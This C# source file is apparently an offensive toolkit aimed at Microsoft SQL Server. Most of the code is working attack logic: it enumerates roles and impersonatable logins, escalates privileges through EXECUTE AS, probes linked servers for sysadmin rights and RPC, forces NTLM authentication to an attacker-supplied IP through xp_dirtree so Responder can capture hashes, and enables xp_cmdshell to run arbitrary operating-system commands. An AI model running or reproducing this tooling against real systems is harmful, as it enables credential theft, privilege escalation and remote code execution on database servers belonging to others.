using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SqlClient;
namespace TurtleToolKitSQL
{
    public class SQL
    {
        // setting class variables
        private string[] RolesToCheck = { "Public", "SysAdmin", "ServerAdmin", "SetupAdmin", "SecurityAdmin", "ProcessAdmin", "DbCreator", "DiskAdmin", "BulkAdmin" };
        public string startingDb;
        public string targetServer;
        public string targetDatabase;
        public bool useADCreds;
        public string userName;
        public string userPass;
        public List<string> LinkedSqlServers;
        public List<string> TrustWorthyDbs;
        public List<string> LoginsCanBeImpersonated;
        SqlConnection sqlConn; // database connection used throughout class
        // Constructor
        public SQL(string srv, string db, bool ADCreds = false, string user = "", string password = "")
        {
            useADCreds = ADCreds;
            targetServer = srv;
            targetDatabase = db;
            TrustWorthyDbs = new List<string>();
            LoginsCanBeImpersonated = new List<string>();
            LinkedSqlServers = new List<string>();
            // init creds if passed
            if (!String.IsNullOrWhiteSpace(user))
            {
                userName = user;
            }
            if (!string.IsNullOrWhiteSpace(password))
            {
                userPass = password;
            }
        }
        //Authentication Function
        public bool ConnectToDb()
        {
            string connString;
            // if using user creds
            if (!useADCreds)
            {
                connString = String.Format("Server={0};Database={1};User id={2};Password={3}", targetServer, targetDatabase, userName, userPass);
                sqlConn = new SqlConnection(connString);
                //Authenticate
                try
                {
                    sqlConn.Open();
                    Console.WriteLine("::: Sucessfully Authenticated With Provided Creds :::");
                    return true;
                }
                catch
                {
                    Console.WriteLine("!!! Failed to authenticate With Provided Creds !!!");
                    return false;
                }
            }
            // else use AD CREDS
            connString = "Server = " + targetServer + "; Database = " + targetDatabase + "; Integrated Security = True;";
            sqlConn = new SqlConnection(connString);
            try
            {
                sqlConn.Open();
                Console.WriteLine("::: Sucessfully Authenticated With Current AD User :::");
                return true;
            }
            catch
            {
                Console.WriteLine("!!! Failed to authenticate With Current AD User !!!");
                return false;
            }
        }
        public void CloseDb()
        {
            sqlConn.Close();
        }
        public void GetCurrentDb()
        {
            string query = "SELECT db_name();";
            SqlCommand command = new SqlCommand(query, sqlConn);
            SqlDataReader commandReader = command.ExecuteReader();
            commandReader.Read();
            Console.WriteLine("::: Current DB {0} :::", commandReader[0]);
            startingDb = commandReader[0].ToString();
            commandReader.Close();
        }
        public void GetCurrentDbUser()
        {
            //Send a command to get current user
            string queryLogin = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(queryLogin, sqlConn);
            SqlDataReader commandReader = command.ExecuteReader();
            commandReader.Read();
            Console.WriteLine("::: Logged in as user {0} :::", commandReader[0]);
            commandReader.Close();
        }
        public void GetCurrentDbUserContext()
        {
            //Send a command to get current user
            string queryLogin = "SELECT USER_NAME();";
            SqlCommand command = new SqlCommand(queryLogin, sqlConn);
            SqlDataReader commandReader = command.ExecuteReader();
            commandReader.Read();
            Console.WriteLine("::: Executing in context of user {0} :::", commandReader[0]);
            commandReader.Close();
        }
        public void GetLoggedInUser()
        {
            //Send a command to get current user
            string queryLogin = "SELECT CURRENT_USER;";
            SqlCommand command = new SqlCommand(queryLogin, sqlConn);
            SqlDataReader commandReader = command.ExecuteReader();
            commandReader.Read();
            Console.WriteLine("::: Logged in as {0} :::", commandReader[0]);
            commandReader.Close();
        }
        public bool CheckRole(string roleToCheck)
        {
            // send command to get current user role membership
            string queryRole = "SELECT IS_SRVROLEMEMBER('" + roleToCheck + "');";
            SqlCommand command = new SqlCommand(queryRole, sqlConn);
            SqlDataReader commandReader = command.ExecuteReader();
            commandReader.Read();
            Int32 role = Int32.Parse(commandReader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("::: User is member of {0} role :::", roleToCheck);
                commandReader.Close();
                return true;
            }
            else
            {
                Console.WriteLine("::: User is NOT member of {0} role :::", roleToCheck);
                commandReader.Close();
                return false;
            }
        }
        public void CheckAllRoles()
        {
            foreach (string role in RolesToCheck)
            {
                CheckRole(role);
            }
        }
        public void GetImpersonatableUsers()
        {
            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            SqlCommand command = new SqlCommand(query, sqlConn);
            SqlDataReader reader = command.ExecuteReader();
            while (reader.Read() == true)
                {
                    Console.WriteLine("::: Logins that can be impersonated: {0} :::", reader[0]);
                    LoginsCanBeImpersonated.Add(reader[0].ToString());
                }
            reader.Close();
        }

        public void CheckCanUseDbo()
        {
            Console.WriteLine("::: Checking if can execute as DBO ::: ");
            string execAs = "use msdb;EXECUTE AS USER = 'dbo'";
            SqlCommand command = new SqlCommand(execAs, sqlConn);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
        }
        public void RevertUserMsdb()
        {
            Console.WriteLine("::: Reverting User :::");
            string revert = string.Format("use msdb;REVERT;", startingDb);
            SqlCommand command = new SqlCommand(revert, sqlConn);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
        }
        public void CheckXpShellEnabled()
        {
            // check for show advanced
            Console.WriteLine("::: Checking if xpCMDShell is enabled :::");
            string res = "sp_configure 'Show Advanced Options'";
            SqlCommand command = new SqlCommand(res, sqlConn);
            SqlDataReader reader = command.ExecuteReader();
            while (reader.Read() == true)
            {
                if (reader.GetValue(3).ToString() == "0")
                {
                    Console.WriteLine("::: Show Advanced Not Enabled :::");
                } else {
                    Console.WriteLine("::: Show Advanced Enabled :::");
                }
            }
            reader.Close();
            // check for xp cmd shell
            try
            {
                res = "sp_configure 'xp_cmdshell'";
                command = new SqlCommand(res, sqlConn);
                reader = command.ExecuteReader();
                while (reader.Read() == true)
                {
                    if (reader.GetValue(3).ToString() == "0")
                    {
                        Console.WriteLine("::: xpCMDShell Not Enabled :::");
                    }
                    else
                    {
                        Console.WriteLine("::: xpCMDShell Enabled :::");
                    }
                }
                reader.Close();
                return;
            } catch
            {
                Console.WriteLine("::: Need to enable advanced options first to enable cmd shell :::");
                reader.Close();
                return;

            }
        }

        // Impersonation 
        public void ImpersonateDbLogin(string userToImpersonate)
        {
            Console.WriteLine("::: Attempting to Impersonate user {0} :::", userToImpersonate);
            string execAs = "EXECUTE AS LOGIN = '" + userToImpersonate + "'";
            SqlCommand command = new SqlCommand(execAs, sqlConn);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

        }

        public void RevertUser()
        {
            Console.WriteLine("::: Reverting User :::");
            string revert = string.Format("use master;REVERT;", startingDb);
            SqlCommand command = new SqlCommand(revert, sqlConn);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
        }
        public void GetLinkedServers()
        {
            List<string> linkedSrvs = new List<string>();
            string query = "EXEC sp_linkedservers;";
            SqlCommand command = new SqlCommand(query, sqlConn);
            SqlDataReader reader = command.ExecuteReader();
            while (reader.Read())
            {
                LinkedSqlServers.Add(reader[0].ToString());
                Console.WriteLine("::: Linked SQL Server {0} :::", reader[0]);
                linkedSrvs.Add(reader[0].ToString());

            }
            linkedSrvs.Add("DC01");
            linkedSrvs.Add("dc01");
            LinkedSqlServers = linkedSrvs;
            reader.Close();
            return;
        }
        public void LinkedServerEnumeration()
        {
            Console.WriteLine("::: Enumerating Linked Servers :::");
            string q;
            SqlCommand command;
            SqlDataReader reader;
            // check who you are running as 
            try
            {
                foreach (string srv in LinkedSqlServers)
                {
                    q = String.Format("select r from openquery(\"{0}\",'select SYSTEM_USER as r');", srv);
                    command = new SqlCommand(q, sqlConn);
                    reader = command.ExecuteReader();
                    while (reader.Read())
                    {
                        Console.WriteLine(" :::Executing as {0} on {1} :::", reader[0], srv);
                    }
                    reader.Close();
                }
            } catch 
            {
                Console.Write("");
            }
            // check role on server "select * from openquery(`"$currentSrv`",'SELECT IS_SRVROLEMEMBER(''sysadmin'')');"
            try
            {
                foreach (string srv in LinkedSqlServers)
                {
                    q = String.Format("select * from openquery(\"{0}\",'select IS_SRVROLEMEMBER(''sysadmin'')');", srv);
                    command = new SqlCommand(q, sqlConn);
                    reader = command.ExecuteReader();
                    while (reader.Read())
                    {
                        if (reader[0].ToString().Contains("1"))
                        {
                            Console.WriteLine("::: You are sysadmin on {0} :::", srv);
                        } else
                        {
                            Console.WriteLine("->> {0}", reader[0].ToString());
                        }
                    }
                    reader.Close();
                }
            }
            catch
            {
                Console.Write("");
            }
            // check if links have outbound RPC enabled to perform xp CMD over link
            //"EXEC ('sp_configure ''show advanced options''') AT $currentSrv"
            // SELECT is_rpc_out_enabled FROM sys.servers WHERE name = 'APPSRV01'
            try
            {
                foreach (string srv in LinkedSqlServers)
                {
                    q = String.Format("SELECT is_rpc_out_enabled FROM sys.servers WHERE name = '{0}'", srv);
                    command = new SqlCommand(q, sqlConn);
                    reader = command.ExecuteReader();
                    while (reader.Read())
                    {
                        if (reader[0].ToString() == "False")
                        {
                            Console.WriteLine("::: rpc out disabled on {0} :::", srv);
                        }
                        else
                        {
                            Console.WriteLine("::: rpc out enabled on {0} :::", srv);
                        }
                    }
                    reader.Close();
                }
            }
            catch
            {
                Console.Write("");

            }
        }
        /// single query
        public bool PerformQuery(string cmd)
        {
            SqlCommand command;
            SqlDataReader reader;
            try
            {
                command = new SqlCommand(cmd, sqlConn);
                reader = command.ExecuteReader();
                while (reader.Read())
                {
                    // if multiple columns print them all out
                    if (reader.FieldCount > 1)
                    {
                        for (int x = 1; x < reader.FieldCount; x++)
                        {
                            Console.WriteLine("{0} -> {1}", reader.GetName(x).ToString(), reader.GetValue(x));
                        }
                    } else
                    {
                        Console.WriteLine("{0} -> {1}", reader.GetName(0).ToString(), reader.GetValue(0));
                    }
                }
                reader.Close();
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                return false;
            }

        }

        /// Attacks
        public bool ConnectToShare(string attackerIp) {
        Console.WriteLine("::: Make sure you have responder running to capture hashes :::");
            try
            {
                string query = "EXEC master..xp_dirtree \" \\\\" + attackerIp + "\\\\test\";";
        Console.WriteLine("::: Attemping -> {0} :::", query);
                SqlCommand command = new SqlCommand(query, sqlConn);
        SqlDataReader reader = command.ExecuteReader();
        reader.Close();
                return true;
            }
            catch
            {
                Console.WriteLine("Error attempting to connect back to attacker share");
                return false;
            }
        }
        public void ExecutionViaCmdShell(string cmd)
        {
            try
            {
                Console.WriteLine("::: You must have sysadmin role membership for this method (via impersonation or other means) :::");
                string enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                string execCmd = "EXEC xp_cmdshell " + cmd;
                // enable xpcmd
                SqlCommand command = new SqlCommand(enable_xpcmd, sqlConn);
                SqlDataReader reader = command.ExecuteReader();
                reader.Close();
                // exec command
                command = new SqlCommand(execCmd, sqlConn);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("::: cmd res -> {0} :::", reader[0]);
                reader.Close();
                // revert settings?
            }
            catch (Exception e)
            {
                Console.WriteLine("Failed! Try impersonating a user before running this function");

            }
        }
    }
}
